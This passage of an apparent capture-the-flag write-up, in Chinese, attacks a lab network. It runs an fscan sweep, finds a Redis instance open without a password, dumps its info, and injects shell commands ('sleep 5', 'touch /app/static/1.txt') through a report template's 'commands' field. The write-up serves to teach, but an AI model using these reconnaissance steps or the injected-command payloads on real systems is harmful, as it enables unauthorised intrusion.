<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@ff7bf03fb11e:/tmp<span class="comment"># ./fscan -h 192.168.100.10/24</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-09-20 13:29:30] [INFO] 暴力破解线程数: 1</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:30] [INFO] 开始信息扫描</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:30] [INFO] CIDR范围: 192.168.100.0-192.168.100.255</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:30] [INFO] 生成IP范围: 192.168.100.0.%!d(string=192.168.100.255) - %!s(MISSING).%!d(MISSING)</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:30] [INFO] 解析CIDR 192.168.100.10/24 -&gt; IP范围 192.168.100.0-192.168.100.255</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:30] [INFO] 最终有效主机数量: 256</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:30] [INFO] 开始主机扫描</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:31] [SUCCESS] 目标 192.168.100.1   存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:31] [SUCCESS] 目标 192.168.100.10  存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:31] [SUCCESS] 目标 192.168.100.20  存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:31] [SUCCESS] 目标 192.168.100.30  存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:31] [SUCCESS] 目标 192.168.100.40  存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [INFO] 存活主机数量: 5</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [INFO] 有效端口数量: 233</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [SUCCESS] 端口开放 192.168.100.1:22</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [SUCCESS] 端口开放 192.168.100.20:6379</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [SUCCESS] 端口开放 192.168.100.40:8080</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [SUCCESS] 端口开放 192.168.100.30:8080</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [SUCCESS] 端口开放 192.168.100.1:3000</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:34] [SUCCESS] 服务识别 192.168.100.1:22 =&gt; [ssh] 版本:9.2p1 Debian 2+deb12u7 产品:OpenSSH 系统:Linux 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7.]</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:39] [SUCCESS] 服务识别 192.168.100.20:6379 =&gt; [redis] 版本:7.4.5 产品:Redis key-value store</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:39] [SUCCESS] 服务识别 192.168.100.40:8080 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:39] [SUCCESS] 服务识别 192.168.100.30:8080 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:44] [SUCCESS] 服务识别 192.168.100.1:3000 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:44] [INFO] 存活端口数量: 5</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:44] [INFO] 开始漏洞扫描</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:44] [INFO] 加载的插件: redis, ssh, webpoc, webtitle</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:44] [SUCCESS] 网站标题 http://192.168.100.30:8080 状态码:200 长度:5976   标题:智能办公管理系统 - 智能办公管理系统</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:44] [SUCCESS] 网站标题 http://192.168.100.1:3000 状态码:200 长度:7801   标题:智能商城 - 您的购物天堂</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:44] [SUCCESS] 网站标题 http://192.168.100.40:8080 状态码:200 长度:7211   标题:Open WebUI</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:47] [SUCCESS] Redis 192.168.100.20:6379 发现未授权访问 文件位置:/data/dump.rdb</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:51] [SUCCESS] Redis无密码连接成功: 192.168.100.20:6379</span></span><br><span class="line"><span class="string">[2025-09-20 13:29:51] [SUCCESS] 扫描已完成: 8/8</span></span><br></pre></td></tr></table></figure>

<p>有个redis未授权连接一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\baozhongqi&gt; redis-cli -h <span class="number">192.168</span><span class="number">.100</span><span class="number">.20</span> -p <span class="number">6379</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.100</span><span class="number">.20</span>:<span class="number">6379</span>&gt; info</span><br><span class="line"><span class="comment"># Server</span></span><br><span class="line">redis_version:<span class="number">7.4</span><span class="number">.5</span></span><br><span class="line">redis_git_sha1:<span class="number">00000000</span></span><br><span class="line">redis_git_dirty:<span class="number">0</span></span><br><span class="line">redis_build_id:14ef7c78d3983ab</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux <span class="number">6.1</span><span class="number">.0</span>-<span class="number">37</span>-amd64 x86_64</span><br><span class="line">arch_bits:<span class="number">64</span></span><br><span class="line">monotonic_clock:POSIX clock_gettime</span><br><span class="line">multiplexing_api:epoll</span><br><span class="line">atomicvar_api:c11-builtin</span><br><span class="line">gcc_version:<span class="number">14.2</span><span class="number">.0</span></span><br><span class="line">process_id:<span class="number">1</span></span><br><span class="line">process_supervised:no</span><br><span class="line">run_id:164070046b533e020f5f5b58eae4654a63257f43</span><br><span class="line">tcp_port:<span class="number">6379</span></span><br><span class="line">server_time_usec:<span class="number">1758375263434887</span></span><br><span class="line">uptime_in_seconds:<span class="number">79981</span></span><br><span class="line">uptime_in_days:<span class="number">0</span></span><br><span class="line">hz:<span class="number">10</span></span><br><span class="line">configured_hz:<span class="number">10</span></span><br><span class="line">lru_clock:<span class="number">13544799</span></span><br><span class="line">executable:/data/redis-server</span><br><span class="line">config_file:</span><br><span class="line">io_threads_active:<span class="number">0</span></span><br><span class="line">listener0:name=tcp,bind=*,bind=-::*,port=<span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clients</span></span><br><span class="line">connected_clients:<span class="number">3</span></span><br><span class="line">cluster_connections:<span class="number">0</span></span><br><span class="line">maxclients:<span class="number">10000</span></span><br><span class="line">client_recent_max_input_buffer:<span class="number">20480</span></span><br><span class="line">client_recent_max_output_buffer:<span class="number">0</span></span><br><span class="line">blocked_clients:<span class="number">0</span></span><br><span class="line">tracking_clients:<span class="number">0</span></span><br><span class="line">pubsub_clients:<span class="number">0</span></span><br><span class="line">watching_clients:<span class="number">0</span></span><br><span class="line">clients_in_timeout_table:<span class="number">0</span></span><br><span class="line">total_watched_keys:<span class="number">0</span></span><br><span class="line">total_blocking_keys:<span class="number">0</span></span><br><span class="line">total_blocking_keys_on_nokey:<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Memory</span></span><br><span class="line">used_memory:<span class="number">1399664</span></span><br><span class="line">used_memory_human:<span class="number">1.33</span>M</span><br><span class="line">used_memory_rss:<span class="number">10629120</span></span><br><span class="line">used_memory_rss_human:<span class="number">10.14</span>M</span><br><span class="line">used_memory_peak:<span class="number">1558104</span></span><br><span class="line">used_memory_peak_human:<span class="number">1.49</span>M</span><br><span class="line">used_memory_peak_perc:<span class="number">89.83</span>%</span><br><span class="line">used_memory_overhead:<span class="number">974712</span></span><br><span class="line">used_memory_startup:<span class="number">946168</span></span><br><span class="line">used_memory_dataset:<span class="number">424952</span></span><br><span class="line">used_memory_dataset_perc:<span class="number">93.71</span>%</span><br><span class="line">allocator_allocated:<span class="number">2109640</span></span><br><span class="line">allocator_active:<span class="number">2482176</span></span><br><span class="line">allocator_resident:<span class="number">5873664</span></span><br><span class="line">allocator_muzzy:<span class="number">0</span></span><br><span class="line">total_system_memory:<span class="number">7992999936</span></span><br><span class="line">total_system_memory_human:<span class="number">7.44</span>G</span><br><span class="line">used_memory_lua:<span class="number">31744</span></span><br><span class="line">used_memory_vm_eval:<span class="number">31744</span></span><br><span class="line">used_memory_lua_human:<span class="number">31.00</span>K</span><br><span class="line">used_memory_scripts_eval:<span class="number">0</span></span><br><span class="line">number_of_cached_scripts:<span class="number">0</span></span><br><span class="line">number_of_functions:<span class="number">0</span></span><br><span class="line">number_of_libraries:<span class="number">0</span></span><br><span class="line">used_memory_vm_functions:<span class="number">32768</span></span><br><span class="line">used_memory_vm_total:<span class="number">64512</span></span><br><span class="line">used_memory_vm_total_human:<span class="number">63.00</span>K</span><br><span class="line">used_memory_functions:<span class="number">192</span></span><br><span class="line">used_memory_scripts:<span class="number">192</span></span><br><span class="line">used_memory_scripts_human:192B</span><br><span class="line">maxmemory:<span class="number">0</span></span><br><span class="line">maxmemory_human:0B</span><br><span class="line">maxmemory_policy:noeviction</span><br><span class="line">allocator_frag_ratio:<span class="number">1.18</span></span><br><span class="line">allocator_frag_bytes:<span class="number">296504</span></span><br><span class="line">allocator_rss_ratio:<span class="number">2.37</span></span><br><span class="line">allocator_rss_bytes:<span class="number">3391488</span></span><br><span class="line">rss_overhead_ratio:<span class="number">1.81</span></span><br><span class="line">rss_overhead_bytes:<span class="number">4755456</span></span><br><span class="line">mem_fragmentation_ratio:<span class="number">7.60</span></span><br><span class="line">mem_fragmentation_bytes:<span class="number">9231280</span></span><br><span class="line">mem_not_counted_for_evict:<span class="number">640</span></span><br><span class="line">mem_replication_backlog:<span class="number">0</span></span><br><span class="line">mem_total_replication_buffers:<span class="number">0</span></span><br><span class="line">mem_clients_slaves:<span class="number">0</span></span><br><span class="line">mem_clients_normal:<span class="number">26256</span></span><br><span class="line">mem_cluster_links:<span class="number">0</span></span><br><span class="line">mem_aof_buffer:<span class="number">640</span></span><br><span class="line">mem_allocator:jemalloc-<span class="number">5.3</span><span class="number">.0</span></span><br><span class="line">mem_overhead_db_hashtable_rehashing:<span class="number">0</span></span><br><span class="line">active_defrag_running:<span class="number">0</span></span><br><span class="line">lazyfree_pending_objects:<span class="number">0</span></span><br><span class="line">lazyfreed_objects:<span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Persistence</span></span><br><span class="line">loading:<span class="number">0</span></span><br><span class="line">async_loading:<span class="number">0</span></span><br><span class="line">current_cow_peak:<span class="number">0</span></span><br><span class="line">current_cow_size:<span class="number">0</span></span><br><span class="line">current_cow_size_age:<span class="number">0</span></span><br><span class="line">current_fork_perc:<span class="number">0.00</span></span><br><span class="line">current_save_keys_processed:<span class="number">0</span></span><br><span class="line">current_save_keys_total:<span class="number">0</span></span><br><span class="line">rdb_changes_since_last_save:<span class="number">12</span></span><br><span class="line">rdb_bgsave_in_progress:<span class="number">0</span></span><br><span class="line">rdb_last_save_time:<span class="number">1758372929</span></span><br><span class="line">rdb_last_bgsave_status:ok</span><br><span class="line">rdb_last_bgsave_time_sec:<span class="number">0</span></span><br><span class="line">rdb_current_bgsave_time_sec:-<span class="number">1</span></span><br><span class="line">rdb_saves:<span class="number">3</span></span><br><span class="line">rdb_last_cow_size:<span class="number">380928</span></span><br><span class="line">rdb_last_load_keys_expired:<span class="number">0</span></span><br><span class="line">rdb_last_load_keys_loaded:<span class="number">0</span></span><br><span class="line">aof_enabled:<span class="number">1</span></span><br><span class="line">aof_rewrite_in_progress:<span class="number">0</span></span><br><span class="line">aof_rewrite_scheduled:<span class="number">0</span></span><br><span class="line">aof_last_rewrite_time_sec:-<span class="number">1</span></span><br><span class="line">aof_current_rewrite_time_sec:-<span class="number">1</span></span><br><span class="line">aof_last_bgrewrite_status:ok</span><br><span class="line">aof_rewrites:<span class="number">0</span></span><br><span class="line">aof_rewrites_consecutive_failures:<span class="number">0</span></span><br><span class="line">aof_last_write_status:ok</span><br><span class="line">aof_last_cow_size:<span class="number">0</span></span><br><span class="line">module_fork_in_progress:<span class="number">0</span></span><br><span class="line">module_fork_last_cow_size:<span class="number">0</span></span><br><span class="line">aof_current_size:<span class="number">2697</span></span><br><span class="line">aof_base_size:<span class="number">88</span></span><br><span class="line">aof_pending_rewrite:<span class="number">0</span></span><br><span class="line">aof_buffer_length:<span class="number">0</span></span><br><span class="line">aof_pending_bio_fsync:<span class="number">0</span></span><br><span class="line">aof_delayed_fsync:<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stats</span></span><br><span class="line">total_connections_received:<span class="number">7989</span></span><br><span class="line">total_commands_processed:<span class="number">10969</span></span><br><span class="line">instantaneous_ops_per_sec:<span class="number">0</span></span><br><span class="line">total_net_input_bytes:<span class="number">164092</span></span><br><span class="line">total_net_output_bytes:<span class="number">409348</span></span><br><span class="line">total_net_repl_input_bytes:<span class="number">0</span></span><br><span class="line">total_net_repl_output_bytes:<span class="number">0</span></span><br><span class="line">instantaneous_input_kbps:<span class="number">0.00</span></span><br><span class="line">instantaneous_output_kbps:<span class="number">0.00</span></span><br><span class="line">instantaneous_input_repl_kbps:<span class="number">0.00</span></span><br><span class="line">instantaneous_output_repl_kbps:<span class="number">0.00</span></span><br><span class="line">rejected_connections:<span class="number">0</span></span><br><span class="line">sync_full:<span class="number">0</span></span><br><span class="line">sync_partial_ok:<span class="number">0</span></span><br><span class="line">sync_partial_err:<span class="number">0</span></span><br><span class="line">expired_subkeys:<span class="number">0</span></span><br><span class="line">expired_keys:<span class="number">0</span></span><br><span class="line">expired_stale_perc:<span class="number">0.00</span></span><br><span class="line">expired_time_cap_reached_count:<span class="number">0</span></span><br><span class="line">expire_cycle_cpu_milliseconds:<span class="number">1120</span></span><br><span class="line">evicted_keys:<span class="number">0</span></span><br><span class="line">evicted_clients:<span class="number">0</span></span><br><span class="line">evicted_scripts:<span class="number">0</span></span><br><span class="line">total_eviction_exceeded_time:<span class="number">0</span></span><br><span class="line">current_eviction_exceeded_time:<span class="number">0</span></span><br><span class="line">keyspace_hits:<span class="number">164</span></span><br><span class="line">keyspace_misses:<span class="number">4</span></span><br><span class="line">pubsub_channels:<span class="number">0</span></span><br><span class="line">pubsub_patterns:<span class="number">0</span></span><br><span class="line">pubsubshard_channels:<span class="number">0</span></span><br><span class="line">latest_fork_usec:<span class="number">258</span></span><br><span class="line">total_forks:<span class="number">1</span></span><br><span class="line">migrate_cached_sockets:<span class="number">0</span></span><br><span class="line">slave_expires_tracked_keys:<span class="number">0</span></span><br><span class="line">active_defrag_hits:<span class="number">0</span></span><br><span class="line">active_defrag_misses:<span class="number">0</span></span><br><span class="line">active_defrag_key_hits:<span class="number">0</span></span><br><span class="line">active_defrag_key_misses:<span class="number">0</span></span><br><span class="line">total_active_defrag_time:<span class="number">0</span></span><br><span class="line">current_active_defrag_time:<span class="number">0</span></span><br><span class="line">tracking_total_keys:<span class="number">0</span></span><br><span class="line">tracking_total_items:<span class="number">0</span></span><br><span class="line">tracking_total_prefixes:<span class="number">0</span></span><br><span class="line">unexpected_error_replies:<span class="number">0</span></span><br><span class="line">total_error_replies:<span class="number">31</span></span><br><span class="line">dump_payload_sanitizations:<span class="number">0</span></span><br><span class="line">total_reads_processed:<span class="number">18968</span></span><br><span class="line">total_writes_processed:<span class="number">10983</span></span><br><span class="line">io_threaded_reads_processed:<span class="number">0</span></span><br><span class="line">io_threaded_writes_processed:<span class="number">0</span></span><br><span class="line">client_query_buffer_limit_disconnections:<span class="number">0</span></span><br><span class="line">client_output_buffer_limit_disconnections:<span class="number">0</span></span><br><span class="line">reply_buffer_shrinks:<span class="number">39</span></span><br><span class="line">reply_buffer_expands:<span class="number">11</span></span><br><span class="line">eventloop_cycles:<span class="number">823770</span></span><br><span class="line">eventloop_duration_sum:<span class="number">201034186</span></span><br><span class="line">eventloop_duration_cmd_sum:<span class="number">43994</span></span><br><span class="line">instantaneous_eventloop_cycles_per_sec:<span class="number">10</span></span><br><span class="line">instantaneous_eventloop_duration_usec:<span class="number">256</span></span><br><span class="line">acl_access_denied_auth:<span class="number">0</span></span><br><span class="line">acl_access_denied_cmd:<span class="number">0</span></span><br><span class="line">acl_access_denied_key:<span class="number">0</span></span><br><span class="line">acl_access_denied_channel:<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_failover_state:no-failover</span><br><span class="line">master_replid:4ec7a6f3c1751b9ca2bb85a60ae0aaaabf98928a</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">24</span></span><br><span class="line">second_repl_offset:-<span class="number">1</span></span><br><span class="line">repl_backlog_active:<span class="number">0</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">0</span></span><br><span class="line">repl_backlog_histlen:<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CPU</span></span><br><span class="line">used_cpu_sys:<span class="number">26.989382</span></span><br><span class="line">used_cpu_user:<span class="number">182.022643</span></span><br><span class="line">used_cpu_sys_children:<span class="number">0.000426</span></span><br><span class="line">used_cpu_user_children:<span class="number">0.001780</span></span><br><span class="line">used_cpu_sys_main_thread:<span class="number">26.988181</span></span><br><span class="line">used_cpu_user_main_thread:<span class="number">182.017391</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modules</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Errorstats</span></span><br><span class="line">errorstat_ERR:count=<span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cluster</span></span><br><span class="line">cluster_enabled:<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keyspace</span></span><br><span class="line">db0:keys=<span class="number">10</span>,expires=<span class="number">10</span>,avg_ttl=<span class="number">68250416</span>,subexpiry=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>版本非常新，思考能否把那个数据库文件弄下来，搞半天弄不下来，观察两个web服务30是一个老的管理系统，其中有report，而这个report我正好在redis里面看到过</p>
<p><img src="../images/2025-WMCTF/6.png" alt="img"></p>
<p><img src="../images/2025-WMCTF/7.png" alt="img"></p>
<p>所以也就是说30可以用这个打，而40是一个open webui系统，不知道怎么整</p>
<p>先打30，经过不懈努力终于睡眠了</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sales&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;period&quot;</span><span class="punctuation">:</span> <span class="string">&quot;monthly&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;template_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dynamic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sales&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;revenue&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sleep 5&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;date&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>由于无法判断命令是否执行，并且这是gob反序列化，一般是在<code>/app</code>所以我们尝试写入静态目录下</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sales&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;period&quot;</span><span class="punctuation">:</span> <span class="string">&quot;monthly&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;template_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dynamic&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sales&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;revenue&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;commands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;touch /app/static/1.txt &amp;&amp; sleep 5&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;date&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>成功执行，现在来获取flag即可</p>
